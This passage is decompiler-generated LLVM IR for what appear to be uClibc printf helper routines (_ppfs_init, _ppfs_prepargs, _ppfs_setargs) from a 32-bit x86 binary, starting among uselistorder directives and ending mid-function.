  uselistorder i32 %v0_804eed9, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804eeb9, { 1, 0 }
  uselistorder i32 %v0_804eeb2.pre, { 1, 0 }
  uselistorder i32 %v0_804ee85, { 1, 0 }
  uselistorder i32 %v3_804ee79, { 1, 0 }
  uselistorder i32 %v0_804ee6e, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804ee46, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804ee1f, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804ee07, { 1, 0 }
  uselistorder i32 %v2_804edf3, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804ede0, { 1, 0 }
  uselistorder i32 %v1_804eddd, { 1, 0 }
  uselistorder i32 %v1_804edd3, { 1, 0 }
  uselistorder i32 %v0_804edd3, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804edb2, { 1, 0 }
  uselistorder i32 %v1_804ed8f, { 1, 0 }
  uselistorder i32 %v1_804ed4d, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804ed69, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804ed32, { 1, 0 }
  uselistorder i32 %v1_804ed1d, { 1, 0 }
  uselistorder i32 %v1_804ece9, { 1, 0 }
  uselistorder i32 %v0_804ecc3, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804eca9, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804ec95, { 1, 0 }
  uselistorder i32 %v1_804ec4b, { 1, 0 }
  uselistorder i32 %v4_804ec19, { 1, 0 }
  uselistorder i32 %v0_804ec0e, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804ec09, { 1, 0 }
  uselistorder i32 %v0_804ec42, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804ebf9, { 1, 0 }
  uselistorder i32 %v1_804ebf0, { 1, 0 }
  uselistorder i32 %v1_804ebe4, { 1, 0 }
  uselistorder i32 %v3_804ebd8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804ebce, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804ebc9, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804ebc7, { 1, 0 }
  uselistorder i32 %v0_804ec19, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804ec09, { 1, 2, 0 }
  uselistorder i32 %v3_804eba1, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804eb8f, { 1, 0 }
  uselistorder i32 %v4_804eb86, { 1, 0 }
  uselistorder i32 %v3_804eb86, { 1, 0 }
  uselistorder i32 %v6_804eb7e, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804eb4f, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804eb4e, { 2, 1, 0 }
  uselistorder i32 %v1_804eb27, { 1, 0 }
  uselistorder i32 %v1_804eb1b, { 1, 0 }
  uselistorder i32 %v1_804eb16, { 1, 0 }
  uselistorder i32 %v2_804eb0e, { 1, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v3_804eaf8, { 1, 0, 2 }
  uselistorder i8 %v3_804eae7, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804eade, { 1, 0 }
  uselistorder i32 %v3_804eab0, { 10, 12, 8, 0, 1, 15, 16, 6, 5, 11, 9, 7, 2, 3, 4, 13, 14, 17, 18, 19 }
  uselistorder i32 %v0_804eab0.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804eaac, { 1, 0 }
  uselistorder i32 %v1_804eaac.pre, { 1, 0 }
  uselistorder i32 %v1_804eaab, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804eaa8, { 1, 0 }
  uselistorder i32 %v2_804eaac72, { 1, 0 }
  uselistorder i32 %v3_804ea92, { 1, 0 }
  uselistorder i8 %v4_804ea4e, { 1, 0 }
  uselistorder i32 %v1_804ea4e, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804ea45, { 1, 0 }
  uselistorder i32 %v2_804ea1a, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804ea16, { 1, 0 }
  uselistorder i8 %v2_804ea10, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804ea1e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804ea00, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 1, 2, 4, 5, 0, 7, 6, 3, 8, 9, 10, 11 }
  uselistorder i1* %sf.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 94, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 87, 85, 88, 89, 90, 91, 92, 93 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 63, 62, 61, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804ef3a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804ef33, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804eefb, { 1, 0 }
  uselistorder label %dec_label_pc_804eeb2, { 1, 0 }
  uselistorder label %dec_label_pc_804ee9b, { 1, 0 }
  uselistorder label %dec_label_pc_804ee46, { 1, 0 }
  uselistorder label %dec_label_pc_804ee18, { 1, 0 }
  uselistorder label %dec_label_pc_804edfd, { 1, 0 }
  uselistorder label %dec_label_pc_804ede7, { 1, 0 }
  uselistorder label %dec_label_pc_804edd3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804edce, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ed60, { 1, 0 }
  uselistorder label %dec_label_pc_804ed46, { 1, 0 }
  uselistorder label %dec_label_pc_804ec64, { 1, 0 }
  uselistorder label %dec_label_pc_804ec09, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804ebb7, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804eb67, { 1, 0 }
  uselistorder label %dec_label_pc_804eb4e, { 1, 0 }
  uselistorder label %dec_label_pc_804eb3a, { 1, 0 }
  uselistorder label %dec_label_pc_804eb35, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eb16, { 1, 0 }
  uselistorder label %dec_label_pc_804eaa1, { 1, 0 }
  uselistorder label %dec_label_pc_804ea99, { 1, 0 }
  uselistorder label %dec_label_pc_804ea45, { 1, 0 }
  uselistorder label %dec_label_pc_804ea3a, { 1, 0 }
  uselistorder label %dec_label_pc_804ea10.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ef48 = load i32, i32* @esi, align 4
  %v0_804ef49 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef49, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804ef5d = bitcast i32* %arg1 to i8*
  %v4_804ef5d = call i32 @__GI_memset(i8* %v3_804ef5d, i32 0, i32 188)
  %v0_804ef62 = load i32, i32* @ebx, align 4
  %v1_804ef62 = add i32 %v0_804ef62, 40
  store i32 %v1_804ef62, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804ef6a = add i32 %v0_804ef62, 24
  %v2_804ef6a = inttoptr i32 %v1_804ef6a to i32*
  %v3_804ef6a = load i32, i32* %v2_804ef6a, align 4
  %v4_804ef6a = add i32 %v3_804ef6a, -1
  store i32 %v4_804ef6a, i32* %v2_804ef6a, align 4
  %v0_804ef70 = load i32, i32* @esi, align 4
  %v1_804ef70 = load i32, i32* @ebx, align 4
  %v2_804ef70 = inttoptr i32 %v1_804ef70 to i32*
  store i32 %v0_804ef70, i32* %v2_804ef70, align 4
  %v0_804ef72.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef72

dec_label_pc_804ef72:                             ; preds = %dec_label_pc_804ef72, %entry
  %v0_804ef72 = phi i32 [ %v1_804ef78, %dec_label_pc_804ef72 ], [ %v0_804ef72.pre, %entry ]
  %v1_804ef72 = inttoptr i32 %v0_804ef72 to i32*
  store i32 8, i32* %v1_804ef72, align 4
  %v0_804ef78 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef78 = add i32 %v0_804ef78, 4
  store i32 %v1_804ef78, i32* %eax.global-to-local, align 4
  %v0_804ef7b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ef7b = add i32 %v0_804ef7b, -1
  %v8_804ef7b = icmp eq i32 %v1_804ef7b, 0
  store i32 %v1_804ef7b, i32* %edx.global-to-local, align 4
  %v1_804ef7c = icmp eq i1 %v8_804ef7b, false
  br i1 %v1_804ef7c, label %dec_label_pc_804ef72, label %dec_label_pc_804ef7e

dec_label_pc_804ef7e:                             ; preds = %dec_label_pc_804ef72
  %v0_804ef7e = load i32, i32* @esi, align 4
  store i32 %v0_804ef7e, i32* %eax.global-to-local, align 4
  %v1_804efa920 = inttoptr i32 %v0_804ef7e to i8*
  %v2_804efa921 = load i8, i8* %v1_804efa920, align 1
  %v3_804efa922 = zext i8 %v2_804efa921 to i32
  %v5_804efa923 = and i32 %v1_804ef7b, -256
  %v6_804efa924 = or i32 %v3_804efa922, %v5_804efa923
  store i32 %v6_804efa924, i32* %edx.global-to-local, align 4
  %v4_804efab25 = icmp eq i8 %v2_804efa921, 0
  %v1_804efad27 = icmp eq i1 %v4_804efab25, false
  br i1 %v1_804efad27, label %dec_label_pc_804ef87, label %dec_label_pc_804efaf

dec_label_pc_804ef87:                             ; preds = %dec_label_pc_804ef7e, %dec_label_pc_804efa9.backedge
  %v6_804efa930 = phi i32 [ %v6_804efa9, %dec_label_pc_804efa9.backedge ], [ %v6_804efa924, %dec_label_pc_804ef7e ]
  %v2_804efa929 = phi i8 [ %v2_804efa9, %dec_label_pc_804efa9.backedge ], [ %v2_804efa921, %dec_label_pc_804ef7e ]
  %v0_804ef8c28 = phi i32 [ %v0_804ef8c.be, %dec_label_pc_804efa9.backedge ], [ %v0_804ef7e, %dec_label_pc_804ef7e ]
  %v10_804ef87 = icmp eq i8 %v2_804efa929, 37
  %v1_804ef8a = icmp eq i1 %v10_804ef87, false
  br i1 %v1_804ef8a, label %dec_label_pc_804efa8, label %dec_label_pc_804ef8c

dec_label_pc_804ef8c:                             ; preds = %dec_label_pc_804ef87
  %v1_804ef8c = add i32 %v0_804ef8c28, 1
  store i32 %v1_804ef8c, i32* %eax.global-to-local, align 4
  %v1_804ef8d = inttoptr i32 %v1_804ef8c to i8*
  %v2_804ef8d = load i8, i8* %v1_804ef8d, align 1
  %v11_804ef8d = icmp eq i8 %v2_804ef8d, 37
  br i1 %v11_804ef8d, label %dec_label_pc_804efa8, label %dec_label_pc_804ef92

dec_label_pc_804ef92:                             ; preds = %dec_label_pc_804ef8c
  %v1_804ef95 = load i32, i32* @ebx, align 4
  %v2_804ef95 = inttoptr i32 %v1_804ef95 to i32*
  store i32 %v1_804ef8c, i32* %v2_804ef95, align 4
  %v0_804ef97 = load i32, i32* @ebx, align 4
  %v1_804ef98 = inttoptr i32 %v0_804ef97 to i32*
  %v2_804ef98 = call i32 @_ppfs_parsespec(i32* %v1_804ef98)
  store i32 %v2_804ef98, i32* %eax.global-to-local, align 4
  %v2_804efa0 = icmp slt i32 %v2_804ef98, 0
  br i1 %v2_804efa0, label %dec_label_pc_804efb3, label %dec_label_pc_804efa4

dec_label_pc_804efa4:                             ; preds = %dec_label_pc_804ef92
  %v0_804efa4 = load i32, i32* @ebx, align 4
  %v1_804efa4 = inttoptr i32 %v0_804efa4 to i32*
  %v2_804efa4 = load i32, i32* %v1_804efa4, align 4
  %v4_804efa9.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804efa9.backedge

dec_label_pc_804efa8:                             ; preds = %dec_label_pc_804ef8c, %dec_label_pc_804ef87
  %v0_804efa8 = phi i32 [ %v1_804ef8c, %dec_label_pc_804ef8c ], [ %v0_804ef8c28, %dec_label_pc_804ef87 ]
  %v1_804efa8 = add i32 %v0_804efa8, 1
  br label %dec_label_pc_804efa9.backedge

dec_label_pc_804efa9.backedge:                    ; preds = %dec_label_pc_804efa8, %dec_label_pc_804efa4
  %v4_804efa9.be = phi i32 [ %v4_804efa9.pre.pre, %dec_label_pc_804efa4 ], [ %v6_804efa930, %dec_label_pc_804efa8 ]
  %v0_804ef8c.be = phi i32 [ %v2_804efa4, %dec_label_pc_804efa4 ], [ %v1_804efa8, %dec_label_pc_804efa8 ]
  store i32 %v0_804ef8c.be, i32* %eax.global-to-local, align 4
  %v1_804efa9 = inttoptr i32 %v0_804ef8c.be to i8*
  %v2_804efa9 = load i8, i8* %v1_804efa9, align 1
  %v3_804efa9 = zext i8 %v2_804efa9 to i32
  %v5_804efa9 = and i32 %v4_804efa9.be, -256
  %v6_804efa9 = or i32 %v3_804efa9, %v5_804efa9
  store i32 %v6_804efa9, i32* %edx.global-to-local, align 4
  %v4_804efab = icmp eq i8 %v2_804efa9, 0
  %v1_804efad = icmp eq i1 %v4_804efab, false
  br i1 %v1_804efad, label %dec_label_pc_804ef87, label %dec_label_pc_804efa9.dec_label_pc_804efaf_crit_edge

dec_label_pc_804efa9.dec_label_pc_804efaf_crit_edge: ; preds = %dec_label_pc_804efa9.backedge
  %v0_804efaf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804efaf

dec_label_pc_804efaf:                             ; preds = %dec_label_pc_804efa9.dec_label_pc_804efaf_crit_edge, %dec_label_pc_804ef7e
  %v0_804efaf = phi i32 [ %v0_804efaf.pre, %dec_label_pc_804efa9.dec_label_pc_804efaf_crit_edge ], [ %v0_804ef7e, %dec_label_pc_804ef7e ]
  %v1_804efaf = load i32, i32* @ebx, align 4
  %v2_804efaf = inttoptr i32 %v1_804efaf to i32*
  store i32 %v0_804efaf, i32* %v2_804efaf, align 4
  br label %dec_label_pc_804efb3

dec_label_pc_804efb3:                             ; preds = %dec_label_pc_804ef92, %dec_label_pc_804efaf
  %storemerge = phi i32 [ 0, %dec_label_pc_804efaf ], [ -1, %dec_label_pc_804ef92 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804efb3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804efb3, i32* @edx, align 4
  %v2_804efb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804efb4, i32* @ebx, align 4
  store i32 %v0_804ef48, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804efa9, { 1, 0 }
  uselistorder i8 %v2_804efa9, { 1, 2, 0 }
  uselistorder i32 %v0_804ef8c.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ef8c28, { 1, 0 }
  uselistorder i32 %v0_804ef7e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ef7b, { 0, 2, 1 }
  uselistorder i32 %v1_804ef78, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 6, 5, 7 }
  uselistorder label %dec_label_pc_804efb3, { 1, 0 }
  uselistorder label %dec_label_pc_804ef87, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804efb8 = load i32, i32* @esi, align 4
  %v0_804efb9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804efc5 = add i32 %arg1, 24
  %v2_804efc5 = inttoptr i32 %v1_804efc5 to i32*
  %v3_804efc5 = load i32, i32* %v2_804efc5, align 4
  %v2_804efc8 = add i32 %arg1, 76
  %v3_804efc8 = inttoptr i32 %v2_804efc8 to i32*
  store i32 %arg2, i32* %v3_804efc8, align 4
  %tmp8 = icmp slt i32 %v3_804efc5, 1
  br i1 %tmp8, label %dec_label_pc_804eff6, label %dec_label_pc_804efcf

dec_label_pc_804efcf:                             ; preds = %entry
  %v1_804efd2 = load i32, i32* @ebx, align 4
  %v2_804efd2 = add i32 %v1_804efd2, 28
  %v3_804efd2 = inttoptr i32 %v2_804efd2 to i32*
  store i32 %v3_804efc5, i32* %v3_804efd2, align 4
  %v0_804efd5 = load i32, i32* @ebx, align 4
  %v1_804efd5 = add i32 %v0_804efd5, 24
  %v2_804efd5 = inttoptr i32 %v1_804efd5 to i32*
  store i32 0, i32* %v2_804efd5, align 4
  %v0_804efdc = load i32, i32* @ebx, align 4
  %v1_804efdc = add i32 %v0_804efdc, 4
  %v2_804efdc = inttoptr i32 %v1_804efdc to i32*
  store i32 0, i32* %v2_804efdc, align 4
  %v0_804efe3 = load i32, i32* @ebx, align 4
  %v1_804efe3 = add i32 %v0_804efe3, 8
  %v2_804efe3 = inttoptr i32 %v1_804efe3 to i32*
  store i32 0, i32* %v2_804efe3, align 4
  %v0_804efea = load i32, i32* @ebx, align 4
  %v1_804efeb = call i32 @_ppfs_setargs(i32 %v0_804efea)
  %v1_804eff3 = load i32, i32* @ebx, align 4
  %v2_804eff3 = add i32 %v1_804eff3, 24
  %v3_804eff3 = inttoptr i32 %v2_804eff3 to i32*
  store i32 %v3_804efc5, i32* %v3_804eff3, align 4
  br label %dec_label_pc_804eff6

dec_label_pc_804eff6:                             ; preds = %entry, %dec_label_pc_804efcf
  %v2_804eff6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804efb9, i32* @ebx, align 4
  store i32 %v0_804efb8, i32* @esi, align 4
  ret i32 %v2_804eff6

; uselistorder directives
  uselistorder i32 %v3_804efc5, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804eff6, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804effd = load i32, i32* @ebx, align 4
  store i32 %v0_804effd, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804f002 = add i32 %arg1, 24
  %v2_804f002 = inttoptr i32 %v1_804f002 to i32*
  %v3_804f002 = load i32, i32* %v2_804f002, align 4
  %v4_804f002 = icmp eq i32 %v3_804f002, 0
  %v1_804f006 = add i32 %arg1, 80
  store i32 %v1_804f006, i32* %ebx.global-to-local, align 4
  %v1_804f009 = icmp eq i1 %v4_804f002, false
  %v1_804f0c1 = add i32 %arg1, 8
  %v2_804f0c1 = inttoptr i32 %v1_804f0c1 to i32*
  %v3_804f0c1 = load i32, i32* %v2_804f0c1, align 4
  %v8_804f0c1 = icmp eq i32 %v3_804f0c1, -2147483648
  %v1_804f0c8 = icmp eq i1 %v8_804f0c1, false
  br i1 %v1_804f009, label %dec_label_pc_804f0c1, label %dec_label_pc_804f00f

dec_label_pc_804f00f:                             ; preds = %entry
  br i1 %v1_804f0c8, label %dec_label_pc_804f029, label %dec_label_pc_804f018

dec_label_pc_804f018:                             ; preds = %dec_label_pc_804f00f
  %v1_804f018 = add i32 %arg1, 76
  %v2_804f018 = inttoptr i32 %v1_804f018 to i32*
  %v3_804f018 = load i32, i32* %v2_804f018, align 4
  store i32 %v3_804f018, i32* %eax.global-to-local, align 4
  %v1_804f01b = add i32 %v3_804f018, 4
  store i32 %v1_804f01b, i32* %edx.global-to-local, align 4
  store i32 %v1_804f01b, i32* %v2_804f018, align 4
  %v0_804f021 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f021 = inttoptr i32 %v0_804f021 to i32*
  %v2_804f021 = load i32, i32* %v1_804f021, align 4
  store i32 %v2_804f021, i32* %eax.global-to-local, align 4
  %v1_804f023 = load i32, i32* @ecx, align 4
  %v2_804f023 = add i32 %v1_804f023, 80
  %v3_804f023 = inttoptr i32 %v2_804f023 to i32*
  store i32 %v2_804f021, i32* %v3_804f023, align 4
  %v0_804f026 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f026 = load i32, i32* @ecx, align 4
  %v2_804f026 = add i32 %v1_804f026, 8
  %v3_804f026 = inttoptr i32 %v2_804f026 to i32*
  store i32 %v0_804f026, i32* %v3_804f026, align 4
  %v0_804f029.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804f029

dec_label_pc_804f029:                             ; preds = %dec_label_pc_804f00f, %dec_label_pc_804f018
  %v1_804f038 = phi i32 [ %arg1, %dec_label_pc_804f00f ], [ %v0_804f029.pre, %dec_label_pc_804f018 ]
  %v1_804f029 = add i32 %v1_804f038, 4
  %v2_804f029 = inttoptr i32 %v1_804f029 to i32*
  %v3_804f029 = load i32, i32* %v2_804f029, align 4
  %v8_804f029 = icmp eq i32 %v3_804f029, -2147483648
  %v1_804f030 = icmp eq i1 %v8_804f029, false
  br i1 %v1_804f030, label %dec_label_pc_804f043, label %dec_label_pc_804f032

dec_label_pc_804f032:                             ; preds = %dec_label_pc_804f029
  %v1_804f032 = add i32 %v1_804f038, 76
  %v2_804f032 = inttoptr i32 %v1_804f032 to i32*
  %v3_804f032 = load i32, i32* %v2_804f032, align 4
  store i32 %v3_804f032, i32* %eax.global-to-local, align 4
  %v1_804f035 = add i32 %v3_804f032, 4
  store i32 %v1_804f035, i32* %edx.global-to-local, align 4
  store i32 %v1_804f035, i32* %v2_804f032, align 4
  %v0_804f03b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f03b = inttoptr i32 %v0_804f03b to i32*
  %v2_804f03b = load i32, i32* %v1_804f03b, align 4
  store i32 %v2_804f03b, i32* %eax.global-to-local, align 4
  %v1_804f03d = load i32, i32* @ecx, align 4
  %v2_804f03d = add i32 %v1_804f03d, 80
  %v3_804f03d = inttoptr i32 %v2_804f03d to i32*
  store i32 %v2_804f03b, i32* %v3_804f03d, align 4
  %v0_804f040 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f040 = load i32, i32* @ecx, align 4
  %v2_804f040 = add i32 %v1_804f040, 4
  %v3_804f040 = inttoptr i32 %v2_804f040 to i32*
  store i32 %v0_804f040, i32* %v3_804f040, align 4
  %v1_804f0ba15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804f043

dec_label_pc_804f043:                             ; preds = %dec_label_pc_804f029, %dec_label_pc_804f032
  %v1_804f0ba15 = phi i32 [ %v1_804f038, %dec_label_pc_804f029 ], [ %v1_804f0ba15.pre, %dec_label_pc_804f032 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804f0ba16 = add i32 %v1_804f0ba15, 28
  %v3_804f0ba17 = inttoptr i32 %v2_804f0ba16 to i32*
  %v4_804f0ba18 = load i32, i32* %v3_804f0ba17, align 4
  %v5_804f0bd20 = icmp sgt i32 %v4_804f0ba18, 0
  br i1 %v5_804f0bd20, label %dec_label_pc_804f047, label %dec_label_pc_804f0ef.loopexit

dec_label_pc_804f047:                             ; preds = %dec_label_pc_804f043, %dec_label_pc_804f0b9
  %v1_804f0ba22 = phi i32 [ %v1_804f0ba, %dec_label_pc_804f0b9 ], [ %v1_804f0ba15, %dec_label_pc_804f043 ]
  %v1_804f04721 = phi i32 [ %v1_804f0b9, %dec_label_pc_804f0b9 ], [ 0, %dec_label_pc_804f043 ]
  %v2_804f047 = mul i32 %v1_804f04721, 4
  %v3_804f047 = add i32 %v2_804f047, 40
  %v4_804f047 = add i32 %v3_804f047, %v1_804f0ba22
  %v5_804f047 = inttoptr i32 %v4_804f047 to i32*
  %v6_804f047 = load i32, i32* %v5_804f047, align 4
  store i32 %v6_804f047, i32* %eax.global-to-local, align 4
  %v1_804f04b = add i32 %v6_804f047, -8
  %v9_804f04b = icmp eq i32 %v1_804f04b, 0
  br i1 %v9_804f04b, label %dec_label_pc_804f0b9, label %dec_label_pc_804f050

dec_label_pc_804f050:                             ; preds = %dec_label_pc_804f047
  %v10_804f04b = icmp slt i32 %v1_804f04b, 0
  %v6_804f04b = sub i32 7, %v6_804f047
  %v7_804f04b = and i32 %v6_804f04b, %v6_804f047
  %v8_804f04b = icmp slt i32 %v7_804f04b, 0
  %v1_804f050 = add i32 %v1_804f0ba22, 76
  %v2_804f050 = inttoptr i32 %v1_804f050 to i32*
  %v3_804f050 = load i32, i32* %v2_804f050, align 4
  store i32 %v3_804f050, i32* %edx.global-to-local, align 4
  %v3_804f053 = icmp eq i1 %v10_804f04b, %v8_804f04b
  br i1 %v3_804f053, label %dec_label_pc_804f063, label %dec_label_pc_804f055

dec_label_pc_804f055:                             ; preds = %dec_label_pc_804f050
  %tmp13 = icmp slt i32 %v6_804f047, 3
  %v9_804f05c = icmp eq i32 %v6_804f047, 7
  %v1_804f05f = icmp eq i1 %v9_804f05c, false
  %or.cond = or i1 %tmp13, %v1_804f05f
  br i1 %or.cond, label %dec_label_pc_804f0ac, label %dec_label_pc_804f08e

dec_label_pc_804f063:                             ; preds = %dec_label_pc_804f050
  %tmp14 = icmp sgt i32 %v6_804f047, 1024
  br i1 %tmp14, label %dec_label_pc_804f06c, label %dec_label_pc_804f0ac

dec_label_pc_804f06c:                             ; preds = %dec_label_pc_804f063
  %v6_804f06c = icmp eq i32 %v6_804f047, 2048
  br i1 %v6_804f06c, label %dec_label_pc_804f07c, label %dec_label_pc_804f073

dec_label_pc_804f073:                             ; preds = %dec_label_pc_804f06c
  %v9_804f073 = icmp eq i32 %v6_804f047, 2055
  %v1_804f078 = icmp eq i1 %v9_804f073, false
  br i1 %v1_804f078, label %dec_label_pc_804f0ac, label %dec_label_pc_804f09d

dec_label_pc_804f07c:                             ; preds = %dec_label_pc_804f06c
  %v1_804f07c = add i32 %v3_804f050, 8
  store i32 %v1_804f07c, i32* %eax.global-to-local, align 4
  store i32 %v1_804f07c, i32* %v2_804f050, align 4
  %v0_804f082 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f082 = inttoptr i32 %v0_804f082 to i32*
  %v2_804f082 = load i32, i32* %v1_804f082, align 4
  store i32 %v2_804f082, i32* %eax.global-to-local, align 4
  %v1_804f084 = add i32 %v0_804f082, 4
  %v2_804f084 = inttoptr i32 %v1_804f084 to i32*
  %v3_804f084 = load i32, i32* %v2_804f084, align 4
  store i32 %v3_804f084, i32* %edx.global-to-local, align 4
  %v1_804f087 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f087 = inttoptr i32 %v1_804f087 to i32*
  store i32 %v2_804f082, i32* %v2_804f087, align 4
  %v0_804f089 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f089 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f089 = add i32 %v1_804f089, 4
  %v3_804f089 = inttoptr i32 %v2_804f089 to i32*
  store i32 %v0_804f089, i32* %v3_804f089, align 4
  br label %dec_label_pc_804f0b6

dec_label_pc_804f08e:                             ; preds = %dec_label_pc_804f055
  %v3_804f08e = load i32, i32* %v2_804f050, align 4
  store i32 %v3_804f08e, i32* %edx.global-to-local, align 4
  %v1_804f091 = add i32 %v3_804f08e, 8
  store i32 %v1_804f091, i32* %eax.global-to-local, align 4
  store i32 %v1_804f091, i32* %v2_804f050, align 4
  %v0_804f097 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f097 = inttoptr i32 %v0_804f097 to double*
  %v2_804f097 = load double, double* %v1_804f097, align 4
  %v2_804f099 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804f099 = inttoptr i32 %v2_804f099 to double*
  store double %v2_804f097, double* %v4_804f099, align 4
  br label %dec_label_pc_804f0b6

dec_label_pc_804f09d:                             ; preds = %dec_label_pc_804f073
  %v3_804f09d = load i32, i32* %v2_804f050, align 4
  store i32 %v3_804f09d, i32* %edx.global-to-local, align 4
  %v1_804f0a0 = add i32 %v3_804f09d, 12
  store i32 %v1_804f0a0, i32* %eax.global-to-local, align 4
  store i32 %v1_804f0a0, i32* %v2_804f050, align 4
